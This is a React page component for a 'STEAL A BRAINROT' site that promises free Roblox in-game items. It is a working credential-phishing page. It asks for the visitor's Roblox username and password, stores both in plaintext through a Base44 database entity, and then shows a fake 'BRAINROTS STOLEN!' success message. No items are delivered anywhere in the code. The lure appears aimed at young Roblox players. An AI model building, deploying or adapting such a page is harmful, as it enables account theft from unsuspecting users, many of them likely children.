import React, { useState } from 'react';
import { base44 } from '@/api/base44Client';
import { motion, AnimatePresence } from 'framer-motion';
import { Sparkles, User, Lock, Send, CheckCircle2, ChevronDown, Cloud } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";

const BRAINROTS = [
  { 
    id: 'AdminLB', 
    name: 'Admin Lucky Block', 
    image: 'https://static.wikia.nocookie.net/stealabr/images/7/7c/AdminLuckyBlock.png/revision/latest?cb=20251007132226'
  },
  { 
    id: 'LGC', 
    name: 'La Grande Combinasion', 
    image: 'https://static.wikia.nocookie.net/stealabr/images/d/d8/Carti.png/revision/latest?cb=20250909171004'
  },
];

const STUD_TEXTURE = 'https://qtrypzzcjebvfcihiynt.supabase.co/storage/v1/object/public/base44-prod/public/691084cefbe72ea280edf222/6db0b4e76_studs.png';

const StylizedCloud = ({ delay, duration, top, size }) => (
  <motion.div
    animate={{ x: ['-150%', '150%'] }}
    transition={{ duration, repeat: Infinity, ease: "linear", delay }}
    className="absolute pointer-events-none"
    style={{ top }}
  >
    <div className="relative" style={{ width: size, height: size * 0.5 }}>
      <div className="absolute bg-white rounded-full" style={{ width: size * 0.4, height: size * 0.4, left: 0, bottom: 0, boxShadow: '0 4px 20px rgba(255,255,255,0.8)' }} />
      <div className="absolute bg-white rounded-full" style={{ width: size * 0.5, height: size * 0.5, left: size * 0.25, bottom: size * 0.1, boxShadow: '0 4px 20px rgba(255,255,255,0.8)' }} />
      <div className="absolute bg-white rounded-full" style={{ width: size * 0.45, height: size * 0.45, left: size * 0.5, bottom: 0, boxShadow: '0 4px 20px rgba(255,255,255,0.8)' }} />
    </div>
  </motion.div>
);

export default function Home() {
  const [selectedBrainrots, setSelectedBrainrots] = useState([]);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);

  const handleAddBrainrot = (value) => {
    if (value && !selectedBrainrots.includes(value)) {
      setSelectedBrainrots([...selectedBrainrots, value]);
    }
  };

  const handleRemoveBrainrot = (id) => {
    setSelectedBrainrots(selectedBrainrots.filter(b => b !== id));
  };

  const handleSubmit = async () => {
    if (!username.trim() || !password.trim() || selectedBrainrots.length === 0) {
      return;
    }

    setIsSubmitting(true);
    try {
      await base44.entities.BrainrotSelection.create({
        username: username.trim(),
        password: password.trim(),
        selected_brainrots: selectedBrainrots
      });
      setShowSuccess(true);
      setTimeout(() => {
        setShowSuccess(false);
        setSelectedBrainrots([]);
        setUsername('');
        setPassword('');
      }, 3000);
    } catch (error) {
      console.error('Error submitting:', error);
    }
    setIsSubmitting(false);
  };

  const getBrainrotById = (id) => BRAINROTS.find(b => b.id === id);

  return (
    <div 
      className="min-h-screen relative overflow-hidden bg-gradient-to-b from-blue-400 via-cyan-300 to-blue-200"
    >
      {/* Stylized Clouds */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none">
        <StylizedCloud delay={0} duration={80} top="10%" size={200} />
        <StylizedCloud delay={10} duration={100} top="25%" size={150} />
        <StylizedCloud delay={20} duration={70} top="15%" size={180} />
        <StylizedCloud delay={5} duration={90} top="35%" size={160} />
        <StylizedCloud delay={15} duration={110} top="5%" size={140} />
        <StylizedCloud delay={25} duration={85} top="30%" size={170} />
      </div>

      {/* Content */}
      <div className="relative z-10 container mx-auto px-4 py-12">
        {/* Header */}
        <motion.div
          initial={{ y: -50, opacity: 0 }}
          animate={{ y: 0, opacity: 1 }}
          className="text-center mb-12"
        >
          <div 
            className="inline-block bg-green-600 rounded-3xl px-8 py-6 shadow-2xl border-8 border-white mb-6 relative"
            style={{
              backgroundImage: `url('${STUD_TEXTURE}')`,
              backgroundRepeat: 'repeat',
              backgroundSize: '100px 100px',
            }}
          >
            <h1 className="text-5xl md:text-7xl font-black text-white drop-shadow-[0_4px_8px_rgba(0,0,0,0.8)] relative z-10 tracking-wider">
              STEAL A BRAINROT
            </h1>
            <div className="flex items-center justify-center gap-2 mt-2 relative z-10">
              <Sparkles className="w-6 h-6 text-yellow-300 animate-pulse drop-shadow-lg" />
              <p className="text-2xl font-black text-yellow-300 drop-shadow-lg">Get Your Brainrots!</p>
              <Sparkles className="w-6 h-6 text-yellow-300 animate-pulse drop-shadow-lg" />
            </div>
          </div>
        </motion.div>

        {/* Login Form */}
        <motion.div
          initial={{ y: 50, opacity: 0 }}
          animate={{ y: 0, opacity: 1 }}
          transition={{ delay: 0.2 }}
          className="max-w-2xl mx-auto"
        >
          <div 
            className="bg-green-600 rounded-3xl p-8 shadow-2xl border-8 border-white relative"
            style={{
              backgroundImage: `url('${STUD_TEXTURE}')`,
              backgroundRepeat: 'repeat',
              backgroundSize: '150px 150px',
            }}
          >
            <div className="rounded-2xl p-6 space-y-6">
              {/* Username Input */}
              <div>
                <Label htmlFor="username" className="text-white text-xl font-black mb-2 flex items-center gap-2 drop-shadow-lg">
                  <User className="w-6 h-6" />
                  ROBLOX USERNAME
                </Label>
                <div 
                  className="relative rounded-xl overflow-hidden border-4 border-white bg-amber-900"
                  style={{
                    backgroundImage: `url('${STUD_TEXTURE}')`,
                    backgroundRepeat: 'repeat',
                    backgroundSize: '100px 100px',
                  }}
                >
                  <Input
                    id="username"
                    type="text"
                    placeholder="Enter username"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="h-14 text-lg font-bold bg-transparent text-white placeholder:text-amber-300 border-0"
                    style={{ backgroundColor: 'transparent' }}
                  />
                </div>
              </div>

              {/* Password Input */}
              <div>
                <Label htmlFor="password" className="text-white text-xl font-black mb-2 flex items-center gap-2 drop-shadow-lg">
                  <Lock className="w-6 h-6" />
                  ROBLOX PASSWORD
                </Label>
                <div 
                  className="relative rounded-xl overflow-hidden border-4 border-white bg-amber-900"
                  style={{
                    backgroundImage: `url('${STUD_TEXTURE}')`,
                    backgroundRepeat: 'repeat',
                    backgroundSize: '100px 100px',
                  }}
                >
                  <Input
                    id="password"
                    type="password"
                    placeholder="Enter password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="h-14 text-lg font-bold bg-transparent text-white placeholder:text-amber-300 border-0"
                    style={{ backgroundColor: 'transparent' }}
                  />
                </div>
              </div>

              {/* Brainrot Selector */}
              <div>
                <Label className="text-white text-xl font-black mb-2 flex items-center gap-2 drop-shadow-lg">
                  <Sparkles className="w-6 h-6" />
                  SELECT BRAINROTS
                </Label>
                <div 
                  className="relative rounded-xl overflow-hidden border-4 border-white bg-amber-900"
                  style={{
                    backgroundImage: `url('${STUD_TEXTURE}')`,
                    backgroundRepeat: 'repeat',
                    backgroundSize: '100px 100px',
                  }}
                >
                  <Select onValueChange={handleAddBrainrot}>
                    <SelectTrigger 
                      className="h-14 text-lg font-bold bg-transparent text-white border-0 rounded-none"
                      style={{ backgroundColor: 'transparent' }}
                    >
                      <SelectValue placeholder="Choose a brainrot to add..." className="text-amber-300" />
                    </SelectTrigger>
                    <SelectContent 
                      className="border-4 border-white bg-amber-900"
                      style={{
                        backgroundImage: `url('${STUD_TEXTURE}')`,
                        backgroundRepeat: 'repeat',
                        backgroundSize: '100px 100px',
                      }}
                    >
                      {BRAINROTS.filter(b => !selectedBrainrots.includes(b.id)).map((brainrot) => (
                        <SelectItem 
                          key={brainrot.id} 
                          value={brainrot.id}
                          className="text-white font-bold hover:bg-amber-800/50 cursor-pointer py-3"
                        >
                          <div className="flex items-center gap-3">
                            <img 
                              src={brainrot.image} 
                              alt={brainrot.name}
                              className="w-8 h-8 rounded-lg object-cover border-2 border-white"
                            />
                            <span>{brainrot.name}</span>
                          </div>
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>

                {/* Selected Brainrots */}
                {selectedBrainrots.length > 0 && (
                  <div className="mt-4 space-y-2">
                    <p className="text-white font-black text-sm">SELECTED ({selectedBrainrots.length}):</p>
                    <div className="flex flex-wrap gap-2">
                      {selectedBrainrots.map((id) => {
                        const brainrot = getBrainrotById(id);
                        return (
                          <motion.div
                            key={id}
                            initial={{ scale: 0 }}
                            animate={{ scale: 1 }}
                            exit={{ scale: 0 }}
                            className="flex items-center gap-2 bg-white rounded-xl px-3 py-2 border-2 border-white shadow-lg"
                          >
                            <img 
                              src={brainrot.image} 
                              alt={brainrot.name}
                              className="w-6 h-6 rounded object-cover"
                            />
                            <span className="font-bold text-sm">{brainrot.name}</span>
                            <button
                              onClick={() => handleRemoveBrainrot(id)}
                              className="ml-2 text-red-600 hover:text-red-800 font-black"
                            >
                              ×
                            </button>
                          </motion.div>
                        );
                      })}
                    </div>
                  </div>
                )}
              </div>

              {/* Submit Button */}
              <div 
                className="relative rounded-xl overflow-hidden border-4 border-white"
                style={{
                  backgroundImage: `url('${STUD_TEXTURE}')`,
                  backgroundRepeat: 'repeat',
                  backgroundSize: '100px 100px',
                }}
              >
                <Button
                  onClick={handleSubmit}
                  disabled={!username.trim() || !password.trim() || selectedBrainrots.length === 0 || isSubmitting}
                  className="w-full h-16 text-2xl font-black rounded-none bg-gradient-to-r from-lime-500 to-green-500 hover:from-lime-600 hover:to-green-600 disabled:opacity-50 shadow-none border-0 text-white"
                >
                  {isSubmitting ? (
                    <motion.div
                      animate={{ rotate: 360 }}
                      transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
                    >
                      <Sparkles className="w-8 h-8" />
                    </motion.div>
                  ) : (
                    <>
                      <Send className="w-8 h-8 mr-3" />
                      STEAL BRAINROTS NOW!
                    </>
                  )}
                </Button>
              </div>
            </div>
          </div>
        </motion.div>
      </div>

      {/* Success Modal */}
      <AnimatePresence>
        {showSuccess && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4"
          >
            <motion.div
              initial={{ scale: 0, rotate: -180 }}
              animate={{ scale: 1, rotate: 0 }}
              exit={{ scale: 0, rotate: 180 }}
              className="bg-gradient-to-br from-green-500 to-emerald-600 rounded-3xl p-12 shadow-2xl border-8 border-white max-w-md relative"
              style={{
                backgroundImage: `url('${STUD_TEXTURE}')`,
                backgroundRepeat: 'repeat',
                backgroundSize: '150px 150px',
              }}
            >
              <div className="relative z-10 text-center rounded-2xl p-8">
                <motion.div
                  animate={{ scale: [1, 1.2, 1], rotate: [0, 360] }}
                  transition={{ duration: 0.5 }}
                  className="mb-6"
                >
                  <CheckCircle2 className="w-24 h-24 text-white mx-auto drop-shadow-2xl" />
                </motion.div>
                <h3 className="text-4xl font-black text-white mb-3 drop-shadow-lg">
                  BRAINROTS STOLEN!
                </h3>
                <p className="text-xl font-bold text-yellow-300 drop-shadow-lg">
                  Check your Roblox game! 🎮
                </p>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );

}
